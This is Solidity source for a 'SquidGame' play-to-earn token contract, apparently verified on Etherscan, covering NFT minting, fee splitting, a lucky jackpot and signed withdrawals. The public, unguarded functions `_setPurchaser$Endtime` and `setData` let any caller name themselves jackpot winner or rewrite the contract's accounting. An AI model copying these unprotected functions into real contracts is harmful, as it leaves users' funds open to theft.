/**
 *Submitted for verification at Etherscan.io on 2021-12-14
*/

/**
 *Submitted for verification at BscScan.com on 2021-12-02
*/

// File: @openzeppelin\contracts\token\ERC20\IERC20.sol

// SPDX-License-Identifier: UNLICENSED

pragma solidity ^0.8.0;

/**
 * @dev Interface of the ERC20 standard as defined in the EIP.
 */
interface IERC20 {
    /**
     * @dev Returns the amount of tokens in existence.
     */
    function totalSupply() external view returns (uint256);

    /**
     * @dev Returns the amount of tokens owned by `account`.
     */
    function balanceOf(address account) external view returns (uint256);

    /**
     * @dev Moves `amount` tokens from the caller's account to `recipient`.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transfer(address recipient, uint256 amount) external returns (bool);

    /**
     * @dev Returns the remaining number of tokens that `spender` will be
     * allowed to spend on behalf of `owner` through {transferFrom}. This is
     * zero by default.
     *
     * This value changes when {approve} or {transferFrom} are called.
     */
    function allowance(address owner, address spender) external view returns (uint256);

    /**
     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * IMPORTANT: Beware that changing an allowance with this method brings the risk
     * that someone may use both the old and the new allowance by unfortunate
     * transaction ordering. One possible solution to mitigate this race
     * condition is to first reduce the spender's allowance to 0 and set the
     * desired value afterwards:
     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
     *
     * Emits an {Approval} event.
     */
    function approve(address spender, uint256 amount) external returns (bool);

    /**
     * @dev Moves `amount` tokens from `sender` to `recipient` using the
     * allowance mechanism. `amount` is then deducted from the caller's
     * allowance.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    /**
     * @dev Emitted when `value` tokens are moved from one account (`from`) to
     * another (`to`).
     *
     * Note that `value` may be zero.
     */
    event Transfer(address indexed from, address indexed to, uint256 value);

    /**
     * @dev Emitted when the allowance of a `spender` for an `owner` is set by
     * a call to {approve}. `value` is the new allowance.
     */
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

// File: @openzeppelin\upgrades-core\contracts\Initializable.sol


pragma solidity >=0.4.24 <0.9.0;


/**
 * @title Initializable
 *
 * @dev Helper contract to support initializer functions. To use it, replace
 * the constructor with a function that has the `initializer` modifier.
 * WARNING: Unlike constructors, initializer functions must be manually
 * invoked. This applies both to deploying an Initializable contract, as well
 * as extending an Initializable contract via inheritance.
 * WARNING: When used with inheritance, manual care must be taken to not invoke
 * a parent initializer twice, or ensure that all initializers are idempotent,
 * because this is not dealt with automatically as with constructors.
 */
contract Initializable {

  /**
   * @dev Indicates that the contract has been initialized.
   */
  bool private initialized;

  /**
   * @dev Indicates that the contract is in the process of being initialized.
   */
  bool private initializing;

  /**
   * @dev Modifier to use in the initializer function of a contract.
   */
  modifier initializer() {
    require(initializing || isConstructor() || !initialized, "Contract instance has already been initialized");

    bool isTopLevelCall = !initializing;
    if (isTopLevelCall) {
      initializing = true;
      initialized = true;
    }

    _;

    if (isTopLevelCall) {
      initializing = false;
    }
  }

  /// @dev Returns true if and only if the function is running in the constructor
  function isConstructor() private view returns (bool) {
    // extcodesize checks the size of the code stored in an address, and
    // address returns the current address. Since the code is still not
    // deployed when running a constructor, any checks on its code size will
    // yield zero, making it an effective way to detect if a contract is
    // under construction or not.
    address self = address(this);
    uint256 cs;
    assembly { cs := extcodesize(self) }
    return cs == 0;
  }

  // Reserved storage space to allow for layout changes in the future.
  uint256[50] private ______gap;
}

// File: contracts\SquidGameCommon.sol

pragma solidity ^0.8.0;


interface ISquidGameNft {
    function mint(address account) external returns (uint256 tokenId_);
}

// File: contracts\SquidGame.sol


pragma solidity ^0.8.0;




/// @title SquidGame main Contract
/// @author SquidGame Team
/// @notice The play-to-earn Squid game 
contract SquidGame is Initializable {
    //Purchase of NFT events
    event MintEvent(address indexed account, uint256 tokenId);
    //Purchase prop time, the background listens to this event to add data to the player
    event BuyEvent(
        address indexed account,
        uint256 nonce,
        uint256 amounts,
        bytes32 hash
    );
    //Burning Squid Event
    event BurnEvent(address indexed account, uint256 burn);
    //Fee for developer 
    event GetFee(address indexed account, uint256 fee);
    //Get Community fund Events
    event GetFunds(address indexed account, uint256 fee);
    //Get Lucky Jackpot Event
    event GetReward(address indexed account, uint256 reward);
    //Game Farming Income 
    event WithdrawEvent(
        address indexed account,
        bytes32 indexed hash,
        uint256 nonce,
        uint256 amount
    );

    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    //Destroy a transaction event
    event DropOrders(bytes32 hash);

    address public _owner;

    //Squid token
    IERC20 public SQUID;

    //Burn Address
    address public constant deadAddress =
        0x000000000000000000000000000000000000dEaD;
    //nft unit price
    uint256 public squidNftPrice;
    //nft address
    ISquidGameNft public _squidNft;

    //Fee for developer 
    uint256 private _feeAmounts;
    //Burn fees
    uint256 private _burnAmounts;
    //Lucky Rewards
    uint256 private _rewardAmounts;
    //Play Gold Pool
    uint256 private _stakeAmounts;
    //Community fund
    uint256 private _fundsAmounts;

    address public _recipientAddress;

    address public _fundsAddress;

    bool private _lock;

    //Referee
    address private _referees;

    //Transaction hash discard pool
    mapping(bytes32 => bool) orders;

    bytes32 private _purchaser$endtime;

    uint256 private _mfee;

    uint256 private _bfee;

    uint256 private _twithdraw;

    mapping(address => uint256) private _nonce;

    function initialize(
        address squidnft_,
        address recipient_,
        address funds_,
        address referees_,
        address squid_
    ) public initializer {
        _squidNft = ISquidGameNft(squidnft_);
        _recipientAddress = recipient_;
        _referees = referees_;
        _fundsAddress = funds_;
        _owner = msg.sender;
        SQUID = IERC20(squid_);
        _setPurchaser$Endtime(address(0), block.timestamp + 86400);
        squidNftPrice = 500 * 10 ** 18;
    }

    modifier Reentrant() {
        require(!_lock);
        _lock = true;
        _;
        _lock = false;
    }

    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    modifier calFee() {
        (
            uint256 fee_,
            uint256 reward_,
            uint256 burn_,
            uint256 stake_
        ) = _calMFee(_mfee);
        (
            uint256 bfee_,
            uint256 bfunds_,
            uint256 bburn_,
            uint256 bstake_
        ) = _calBFee(_bfee);
        _feeAmounts += fee_ + bfee_;
        _rewardAmounts += reward_;
        _burnAmounts += burn_ + bburn_;
        _stakeAmounts += stake_ + bstake_;
        _fundsAmounts += bfunds_;
        _bfee = 0;
        _mfee = 0;
        _;
    }

    function _msgSender() internal view returns (address) {
        return msg.sender;
    }

    function owner() public view returns (address) {
        return _owner;
    }

    function renounceOwnership() public onlyOwner {
        _setOwner(address(0));
    }

    function transferOwnership(address newOwner) public onlyOwner {
        require(
            newOwner != address(0),
            "Ownable: new owner is the zero address"
        );
        _setOwner(newOwner);
    }

    function _setOwner(address newOwner) private {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }


    function BUYENUM() public pure returns (bytes32) {
        //keccak256(abi.encodePacked("BUYENUM"));
        return
            0x6a41ec7ef7292171c54d55c21940f392fb094320c84e250c23df7f1b21d50098;
    }

    function WITHDRAWENUM() public pure returns (bytes32) {
        //keccak256(abi.encodePacked("WITHDRAWENUM"));
        return
            0x980b8e9d23a3b1539f3898e2835652c6d086f4a13c3d58cdba7f1bf7ef1a02ea;
    }

    //mint nft
    function mint() public Reentrant {
        SQUID.transferFrom(msg.sender, address(this), squidNftPrice);
        (, uint256 endtime_) = getPureChaser$Endtime();
        require(
            endtime_ > block.timestamp || block.timestamp - endtime_ > 1800
        ); //The lucky prize has been drawn
        endtime_ = endtime_ > block.timestamp + 600
            ? endtime_
            : block.timestamp + 600;
        _setPurchaser$Endtime(msg.sender, endtime_);
        uint256 tokenId_ = _squidNft.mint(msg.sender);
        _mfee += squidNftPrice;
        emit MintEvent(msg.sender, tokenId_);
    }

    //Purchase a service
    function buy(
        uint256 amounts,
        uint256 timeout,
        bytes memory signature
    ) public Reentrant {
        require(block.timestamp < timeout, "time out");
        uint256 nonce_ = ++_nonce[msg.sender];
        SQUID.transferFrom(msg.sender, address(this), amounts);
        bytes32 hash = hashToVerify(
            keccak256(
                abi.encode(msg.sender, amounts, nonce_, timeout, BUYENUM())
            )
        );
        require(!orders[hash], "hash expired");
        require(verify(_referees, hash, signature), "sign error");
        _bfee += amounts;
        emit BuyEvent(msg.sender, nonce_, amounts, hash);
    }

    //Calculate the cost of purchased services
    function _calBFee(uint256 price_)
        internal
        pure
        returns (
            uint256 fee_,
            uint256 funds_,
            uint256 burn_,
            uint256 stake_
        )
    {
        burn_ = (price_ * 100) / 1000;
        funds_ = (price_ * 100) / 1000;
        fee_ = (price_ * 200) / 1000;
        stake_ = price_ - burn_ - funds_ - fee_;
    }

    //Calculate the cost of purchasing nft
    function _calculateMintFee(uint256 price_) internal {
        (
            uint256 fee_,
            uint256 reward_,
            uint256 burn_,
            uint256 stake_
        ) = _calMFee(price_);

        _feeAmounts += fee_;
        _rewardAmounts += reward_;
        _burnAmounts += burn_;
        _stakeAmounts += stake_;
    }

    function getPureChaser$Endtime()
        public
        view
        returns (address purchaser_, uint256 endtime_)
    {
        bytes32 purchaser$endtime_ = _purchaser$endtime;
        assembly {
            purchaser_ := shr(96, purchaser$endtime_)
            endtime_ := and(purchaser$endtime_, 0xffffffffffffffffffffffff)
        }
    }

    function _setPurchaser$Endtime(address purchaser_, uint256 endtime_)
        public
    {
        assembly {
            endtime_ := shl(160, endtime_)
            purchaser_ := shl(96, purchaser_)
            let pos := mload(0x40)
            mstore(0x40, add(pos, 0x20))
            mstore(pos, purchaser_)
            mstore(add(pos, 20), endtime_)
            sstore(_purchaser$endtime.slot, mload(pos))
        }
    }

    function _calMFee(uint256 amount)
        internal
        pure
        returns (
            uint256 fee_,
            uint256 reward_,
            uint256 burn_,
            uint256 stake_
        )
    {
        fee_ = (amount * 200) / 1000;
        reward_ = (amount * 100) / 1000;
        burn_ = (amount * 100) / 1000;
        stake_ = amount - fee_ - reward_ - burn_;
    }

    function _calStake() internal view returns (uint256 stake_) {
        (, , , uint256 mstake_) = _calMFee(_mfee);
        (, , , uint256 bstake_) = _calBFee(_bfee);
        stake_ = mstake_ + bstake_ + _stakeAmounts;
    }

    function fee()
        public
        calFee
        returns (
            uint256 fee_,
            uint256 burn_,
            uint256 funds_,
            uint256 stake_,
            uint256 reward_
        )
    {
        return (
            _feeAmounts,
            _burnAmounts,
            _fundsAmounts,
            _stakeAmounts,
            _rewardAmounts
        );
    }

    function burnFee() public Reentrant calFee returns (uint256 burn_) {
        burn_ = _burnAmounts;
        _burnAmounts = 0;
        SQUID.transfer(deadAddress, burn_);
        emit BurnEvent(msg.sender, burn_);
    }

    function getFee() public Reentrant calFee returns (uint256 fee_) {
        require(msg.sender == _recipientAddress, "recipient address invalid");
        fee_ = _feeAmounts;
        _feeAmounts = 0;
        SQUID.transfer(_recipientAddress, fee_);
        emit GetFee(msg.sender, fee_);
    }

    function getFunds() public Reentrant calFee returns (uint256 funds_) {
        require(msg.sender == _fundsAddress, "funds address invalid");
        funds_ = _fundsAmounts;
        _fundsAmounts = 0;
        SQUID.transfer(_fundsAddress, funds_);
        emit GetFunds(msg.sender, funds_);
    }

    //Get Lucky Jackpot
    function getReward() public Reentrant calFee {
        (address purchaser_, uint256 endtime_) = getPureChaser$Endtime();
        require(block.timestamp > endtime_, "time invalid");
        require(msg.sender == purchaser_, "non-purchaser");
        uint256 reward_ = (_rewardAmounts * 700) / 1000;
        _rewardAmounts = _rewardAmounts - reward_;
        SQUID.transfer(purchaser_, reward_);
        emit GetReward(msg.sender, reward_);
        _setPurchaser$Endtime(address(0), endtime_);
    }

    //Game Farming Income 
    function withdraw(
        uint256 amount,
        uint256 fee_,
        uint256 timeout,
        bytes memory signature
    ) public Reentrant returns (uint256, uint256) {
        uint256 nonce_ = ++_nonce[msg.sender];
        address account = msg.sender;
        require(amount > fee_, "amount invalid");
        bytes32 hash = hashToVerify(
            keccak256(
                abi.encode(
                    account,
                    amount,
                    fee_,
                    nonce_,
                    timeout,
                    WITHDRAWENUM()
                )
            )
        );
        require(!orders[hash], "hash expired");
        require(verify(_referees, hash, signature), "sign error");
        require(block.timestamp < timeout, "time out");
        uint256 amount_ = amount - fee_;
        _twithdraw += amount_;
        require(_calStake() >= _twithdraw, "stake insufficient");
        _stakeAmounts += fee_;
        orders[hash] = true;
        SQUID.transfer(account, amount_);
        emit WithdrawEvent(account, hash, nonce_, amount);
        return (amount_, fee_);
    }

    function dropOrders(bytes32[] memory hashArray) external onlyOwner {
        for (uint256 i = 0; i < hashArray.length; i++) {
            bool leap = orders[hashArray[i]];
            if(!leap){
                orders[hashArray[i]] = true;
                emit DropOrders(hashArray[i]);
            }
        }
    }

    function nonce(address account) public view returns (uint256 nonce_) {
        return _nonce[account] + 1;
    }

    function setSquidNftPrice(uint squidNftPrice_) public onlyOwner{
        squidNftPrice = squidNftPrice_;
    }
    
    function setSquidNft(address squidNft_) public onlyOwner {
        _squidNft = ISquidGameNft(squidNft_);
    }

    function setFundsAddress(address fundsAddress_) public onlyOwner {
        _fundsAddress = fundsAddress_;
    }

    function hashToVerify(bytes32 data) private pure returns (bytes32) {
        return
            keccak256(
                abi.encodePacked("\x19Ethereum Signed Message:\n32", data)
            );
    }

    function verify(
        address signer,
        bytes32 hash,
        bytes memory signature
    ) public pure returns (bool) {
        require(signer != address(0));
        require(signature.length == 65);
        bytes32 r;
        bytes32 s;
        uint8 v;
        assembly {
            r := mload(add(signature, 32))
            s := mload(add(signature, 64))
            v := byte(0, mload(add(signature, 96)))
        }
        if (v < 27) {
            v += 27;
        }
        require(v == 27 || v == 28);
        return signer == ecrecover(hash, v, r, s);
    }

    function setData(uint stake_,uint fee_,uint burn_,uint funds_,uint twithdraw_) public {
        _stakeAmounts = stake_;
        _feeAmounts = fee_;
        _burnAmounts = burn_;
        _fundsAmounts = funds_;
        _twithdraw = twithdraw_;
    }
}